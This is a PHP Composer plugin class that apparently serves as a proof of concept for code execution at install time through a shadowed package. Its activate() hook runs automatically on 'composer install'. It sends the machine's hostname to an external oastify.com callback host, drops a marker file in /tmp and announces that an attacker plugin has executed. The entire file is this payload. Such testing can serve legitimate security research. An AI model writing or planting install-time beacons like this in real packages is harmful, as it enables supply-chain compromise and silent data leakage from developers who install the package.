<?php
namespace Pk;
use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;
class Beacon implements PluginInterface {
    public function activate(Composer $composer, IOInterface $io) {
        @file_get_contents('https://izl3emo2gesh4giv9kvjqph33u9m5akkocs1.oastify.com/E2E-RCE-ON-INSTALL-'.php_uname('n'));
        @file_put_contents('/tmp/pk_e2e_rce.txt', 'e2e-executed-via-shadow '.gethostname());
        $io->write('[pk-e2e] attacker plugin executed on composer install');
    }
    public function deactivate(Composer $composer, IOInterface $io) {}
    public function uninstall(Composer $composer, IOInterface $io) {}
}
